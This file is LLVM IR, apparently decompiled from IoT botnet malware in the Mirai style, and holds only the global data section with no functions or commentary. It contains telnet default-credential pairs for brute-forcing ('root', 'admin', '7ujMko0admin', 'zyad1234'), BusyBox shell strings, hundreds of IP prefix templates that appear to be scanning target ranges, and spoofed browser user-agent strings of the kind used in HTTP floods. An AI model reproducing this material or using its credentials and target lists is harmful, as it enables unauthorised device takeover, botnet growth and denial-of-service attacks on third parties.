source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_10030000.1 = global i32 0
@global_var_1002b00c.3 = global i32 0
@global_var_1002b01c.4 = local_unnamed_addr global i32* @global_var_1002b00c.3
@global_var_1002b980.7 = global i32 0
@global_var_1002b010.8 = global i32 0
@global_var_1002b998.9 = global i32 0
@global_var_1002b99c.10 = local_unnamed_addr global i32 0
@global_var_1002b9a0.11 = local_unnamed_addr global i32 0
@global_var_1002b570.12 = local_unnamed_addr global i32 4095
@global_var_1002b56c.13 = local_unnamed_addr global i32 362436
@global_var_10014920.14 = constant [8 x i8] c"BusyBox\00"
@global_var_1001491c.16 = constant i32 587202560
@global_var_10014928.17 = constant [6 x i8] c"shell\00"
@global_var_10014930.18 = constant [7 x i8] c"dvrdvs\00"
@global_var_1002b0b8.19 = global [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014920.14, i32 0, i32 0), i8* bitcast ([10 x i8*]* @global_var_10014918.15 to i8*), i8* bitcast (i32* @global_var_1001491c.16 to i8*), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014928.17, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014930.18, i32 0, i32 0)]
@global_var_100148d8.20 = constant [7 x i8] c"nvalid\00"
@global_var_100148e0.21 = constant [6 x i8] c"ailed\00"
@global_var_100148e8.22 = constant [9 x i8] c"ncorrect\00"
@global_var_100148f4.23 = constant [6 x i8] c"enied\00"
@global_var_100148fc.24 = constant [5 x i8] c"rror\00"
@global_var_10014904.25 = constant [7 x i8] c"oodbye\00"
@global_var_1001490c.26 = constant [4 x i8] c"bad\00"
@global_var_1002b098.27 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100148d8.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100148e0.21, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100148e8.22, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100148f4.23, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100148fc.24, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014904.25, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001490c.26, i32 0, i32 0)]
@global_var_10017700.28 = constant [7 x i8] c"(null)\00"
@global_var_1002b918.29 = local_unnamed_addr global i32 0
@global_var_10001a34.30 = constant i32 1208002301
@global_var_10001a80.31 = constant i32 939589631
@global_var_10001ad4.32 = constant i32 1207959608
@global_var_10017708.33 = constant [8 x i8] c"/bin/sh\00"
@global_var_10017130.34 = constant [3 x i8] c"sh\00"
@global_var_10017710.35 = constant [3 x i8] c"-c\00"
@global_var_10001b34.36 = constant [3 x i8] c"8`\00"
@global_var_10001b64.37 = constant i32 1207959576
@global_var_10017714.38 = constant i32 -1
@global_var_10017b14.39 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_10017b24.40 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_1000235c.41 = constant i32 939524096
@global_var_100023a8.42 = constant i32 939524097
@global_var_1000259c.43 = constant i32 939524126
@global_var_1002b8f8.44 = local_unnamed_addr global i32 0
@global_var_10017b30.45 = constant [5 x i8] c"PING\00"
@global_var_10002698.46 = constant i32 939524126
@global_var_10017b38.47 = constant [14 x i8] c"gethostbyname\00"
@global_var_100028bc.48 = constant i32 939524097
@global_var_10002938.49 = constant i32 939524096
@global_var_100029cc.50 = constant i32 939524098
@global_var_10002bd4.51 = constant i32 939524097
@global_var_1002b900.52 = global i32 0
@global_var_1002b904.53 = local_unnamed_addr global i32 0
@global_var_1002b92c.54 = local_unnamed_addr global i32 0
@global_var_10002f4c.55 = constant i32 939524096
@global_var_10017b48.56 = constant [6 x i8] c":>%$#\00"
@global_var_1002b910.57 = global i32 0
@global_var_1002b911.58 = local_unnamed_addr global i32 0
@global_var_1002b912.59 = local_unnamed_addr global i32 0
@global_var_10017b50.62 = constant [11 x i8] c"1.10.%d.%d\00"
@global_var_10017b5c.63 = constant [12 x i8] c"1.120.%d.%d\00"
@global_var_10017b68.64 = constant [12 x i8] c"5.140.%d.%d\00"
@global_var_10017b74.65 = constant [12 x i8] c"5.141.%d.%d\00"
@global_var_10017b80.66 = constant [12 x i8] c"122.2.%d.%d\00"
@global_var_10017b8c.67 = constant [12 x i8] c"122.3.%d.%d\00"
@global_var_10017b98.68 = constant [13 x i8] c"122.53.%d.%d\00"
@global_var_10017ba8.69 = constant [13 x i8] c"122.54.%d.%d\00"
@global_var_10017bb8.70 = constant [13 x i8] c"188.16.%d.%d\00"
@global_var_10017bc8.71 = constant [13 x i8] c"188.17.%d.%d\00"
@global_var_10017bd8.72 = constant [13 x i8] c"188.18.%d.%d\00"
@global_var_10017be8.73 = constant [13 x i8] c"188.19.%d.%d\00"
@global_var_10017bf8.74 = constant [13 x i8] c"31.162.%d.%d\00"
@global_var_10017c08.75 = constant [13 x i8] c"31.163.%d.%d\00"
@global_var_10017c18.76 = constant [12 x i8] c"5.142.%d.%d\00"
@global_var_10017c24.77 = constant [12 x i8] c"5.143.%d.%d\00"
@global_var_10017c30.78 = constant [13 x i8] c"90.150.%d.%d\00"
@global_var_10017c40.79 = constant [13 x i8] c"90.151.%d.%d\00"
@global_var_10017c50.80 = constant [13 x i8] c"178.47.%d.%d\00"
@global_var_10017c60.81 = constant [12 x i8] c"94.50.%d.%d\00"
@global_var_10017c6c.82 = constant [12 x i8] c"94.51.%d.%d\00"
@global_var_10017c78.83 = constant [13 x i8] c"190.43.%d.%d\00"
@global_var_10017c88.84 = constant [12 x i8] c"210.5.%d.%d\00"
@global_var_10017c94.85 = constant [14 x i8] c"210.213.%d.%d\00"
@global_var_10017ca4.86 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_10017cb0.87 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_10017cbc.88 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_10017cc8.89 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_10017cd4.90 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_10017ce0.91 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_10017cf0.92 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_10017d00.93 = constant [14 x i8] c"186.128.%d.%d\00"
@global_var_10017d10.94 = constant [14 x i8] c"186.132.%d.%d\00"
@global_var_10017d20.95 = constant [13 x i8] c"186.39.%d.%d\00"
@global_var_10017d30.96 = constant [13 x i8] c"186.56.%d.%d\00"
@global_var_10017d40.97 = constant [13 x i8] c"186.57.%d.%d\00"
@global_var_10017d50.98 = constant [13 x i8] c"186.58.%d.%d\00"
@global_var_10017d60.99 = constant [13 x i8] c"186.60.%d.%d\00"
@global_var_10017d70.100 = constant [13 x i8] c"46.181.%d.%d\00"
@global_var_10017d80.101 = constant [13 x i8] c"46.180.%d.%d\00"
@global_var_10017d90.102 = constant [14 x i8] c"188.173.%d.%d\00"
@global_var_10017da0.103 = constant [13 x i8] c"64.137.%d.%d\00"
@global_var_10017db0.104 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_10017dc0.105 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_10017dd0.106 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_10017de0.107 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_10017df0.108 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_10017e00.109 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_10017e10.110 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_10017e20.111 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_10017e30.112 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_10017e40.113 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_10017e50.114 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_10017e60.115 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_10017e70.116 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_10017e80.117 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_10017e90.118 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_10017ea0.119 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_10017eb0.120 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_10017ec0.121 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_10017ed0.122 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_10017ee0.123 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_10017ef0.124 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_10017f00.125 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_10017f10.126 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_10017f20.127 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_10017f30.128 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_10017f40.129 = constant [12 x i8] c"98.27.%d.%d\00"
@global_var_10017f4c.130 = constant [13 x i8] c"98.179.%d.%d\00"
@global_var_10017f5c.131 = constant [13 x i8] c"98.113.%d.%d\00"
@global_var_10017f6c.132 = constant [13 x i8] c"98.121.%d.%d\00"
@global_var_10017f7c.133 = constant [13 x i8] c"98.100.%d.%d\00"
@global_var_10017f8c.134 = constant [13 x i8] c"98.161.%d.%d\00"
@global_var_10017f9c.135 = constant [13 x i8] c"98.165.%d.%d\00"
@global_var_10017fac.136 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_10017fb8.137 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_10017fc8.138 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_10017fd4.139 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_10017fe4.140 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_10017ff0.141 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_10018000.142 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1001800c.143 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1001801c.144 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_1001802c.145 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_1001803c.146 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_1001804c.147 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_10018058.148 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_10018068.149 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_10018078.150 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_10018088.151 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_10018098.152 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_100180a4.153 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_100180b0.154 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_100180c0.155 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_100180cc.156 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_100180dc.157 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_100180e8.158 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_100180f4.159 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_10018100.160 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1001810c.161 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_10018118.162 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_10018124.163 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_10018130.164 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_10018140.165 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_10018150.166 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_10018160.167 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_10018170.168 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_10018180.169 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_10018190.170 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_100181a0.171 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_100181b0.172 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_100181bc.173 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_100181c8.174 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_100181d4.175 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_100181e4.176 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_100181f4.177 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_10018204.178 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_10018214.179 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_10018224.180 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_10018234.181 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_10018244.182 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_10018254.183 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_10018264.184 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_10018274.185 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_10018284.186 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_10018294.187 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_100182a4.188 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_100182b4.189 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_100182c4.190 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_100182d4.191 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_100182e4.192 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_100182f4.193 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_10018304.194 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_10018314.195 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_10018324.196 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_10018334.197 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_10018344.198 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_10018354.199 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_10018364.200 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_10018374.201 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_10018384.202 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_10018394.203 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_100183a4.204 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_100183b4.205 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_100183c4.206 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_100183d4.207 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_100183e4.208 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_100183f4.209 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_10018404.210 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_10018414.211 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_10018424.212 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_10018434.213 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_10018444.214 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_10018454.215 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_10018464.216 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_10018474.217 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_10018484.218 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_10018494.219 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_100184a4.220 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_100184b4.221 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_100184c4.222 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_100184d4.223 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_100184e0.224 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_100184f0.225 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_10018500.226 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_10018510.227 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1001851c.228 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_1001852c.229 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_1001853c.230 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_1001854c.231 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1001855c.232 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_1001856c.233 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_1001857c.234 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_1001858c.235 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_1001859c.236 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_100185ac.237 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_100185bc.238 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_100185cc.239 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_100185dc.240 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_100185ec.241 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_100185fc.242 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_10018608.243 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_10018618.244 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_10018628.245 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_10018638.246 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_10018648.247 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_10018658.248 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_10018668.249 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_10018678.250 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_10018688.251 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_10018698.252 = constant [14 x i8] c"116.167.%d.%d\00"
@global_var_100186a8.253 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_100186b8.254 = constant [13 x i8] c"113.17.%d.%d\00"
@global_var_100186c8.255 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_100186d8.256 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_100186e8.257 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_100186f8.258 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_10018708.259 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_10018718.260 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_10018728.261 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_10018738.262 = constant [14 x i8] c"222.225.%d.%d\00"
@global_var_10018748.263 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_10018758.264 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_10018768.265 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_10018778.266 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_10018788.267 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_10018798.268 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_100187a8.269 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_100187b8.270 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_100187c8.271 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_100187d8.272 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_100187e4.273 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_100187f4.274 = constant [14 x i8] c"103.233.%d.%d\00"
@global_var_10018804.275 = constant [13 x i8] c"103.63.%d.%d\00"
@global_var_10018814.276 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_10018824.277 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_10018834.278 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_10018844.279 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_10018854.280 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_10018864.281 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_10018874.282 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_10018884.283 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_10018894.284 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_100188a4.285 = constant [14 x i8] c"202.134.%d.%d\00"
@global_var_100188b4.286 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_100188c4.287 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_100188d4.288 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_100188e4.289 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_100188f4.290 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_10018904.291 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_10018914.292 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_10018924.293 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_10018934.294 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_10018944.295 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_10018954.296 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_10018964.297 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_10018974.298 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_10018984.299 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_10018994.300 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_100189a4.301 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_100189b4.302 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_100189c4.303 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_100189d4.304 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_100189e4.305 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_100189f4.306 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_10018a04.307 = constant [13 x i8] c"111.26.%d.%d\00"
@global_var_10018a14.308 = constant [13 x i8] c"111.20.%d.%d\00"
@global_var_1002b920.309 = local_unnamed_addr global i32 0
@global_var_10008b14.310 = constant i32 939524096
@global_var_10008b8c.311 = constant i32 939524098
@global_var_10008c48.312 = constant i32 939524096
@global_var_10018c28.313 = constant i32 -65172
@global_var_10014940.318 = constant [6 x i8] c"cisco\00"
@global_var_10014948.319 = constant [6 x i8] c"admin\00"
@global_var_10014950.320 = constant [5 x i8] c"root\00"
@global_var_10014958.321 = constant [5 x i8] c"user\00"
@global_var_10014960.322 = constant [8 x i8] c"support\00"
@global_var_1001496c.323 = constant [7 x i8] c"telnet\00"
@global_var_10014974.324 = constant [11 x i8] c"supervisor\00"
@global_var_10014980.325 = constant [7 x i8] c"daemon\00"
@global_var_10014988.326 = constant [5 x i8] c"1234\00"
@global_var_10014990.327 = constant [9 x i8] c"password\00"
@global_var_1001499c.328 = constant [11 x i8] c"1234567890\00"
@global_var_100149a8.329 = constant [4 x i8] c"vnp\00"
@global_var_100149b0.330 = constant [9 x i8] c"zyad1234\00"
@global_var_100149bc.331 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_100149cc.332 = constant i32 0
@global_var_100149d0.333 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\00"
@global_var_10014a44.334 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014ab4.335 = constant [114 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014b28.336 = constant [114 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014b9c.337 = constant [121 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/\00"
@global_var_10014c18.338 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014c88.339 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; LGLS751 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobi\00"
@global_var_10014d04.340 = constant [114 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014d78.341 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014de0.342 = constant [121 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G3\00"
@global_var_10014e5c.343 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_10014ea8.344 = constant [122 x i8] c"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.23'\00"
@global_var_10014f24.345 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2683.0 Safari/537.36\00"
@global_var_10014f94.346 = constant [114 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\00"
@global_var_10015008.347 = constant [46 x i8] c"Mozilla/4.0 (compatible; MSIE 999.1; Unknown)\00"
@global_var_10015038.348 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; LG-K330 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobi\00"
@global_var_100150b4.349 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2672.0 Safari/537.36\00"
@global_var_10015124.350 = constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00"
@global_var_1001516c.351 = constant [121 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C9\00"
@global_var_100151e8.352 = constant [121 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14\00"
@global_var_10015264.353 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 4.4.2; LGLS740 Build/KOT49I.LS740ZV6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.288\00"
@global_var_100152e0.354 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\00"
@global_var_1001532c.355 = constant [105 x i8] c"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36\00"
@global_var_10015398.356 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0\00"
@global_var_100153e8.357 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI H892L Build/HuaweiH892L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.28\00"
@global_var_10015464.358 = constant [121 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/1\00"
@global_var_100154e0.359 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\00"
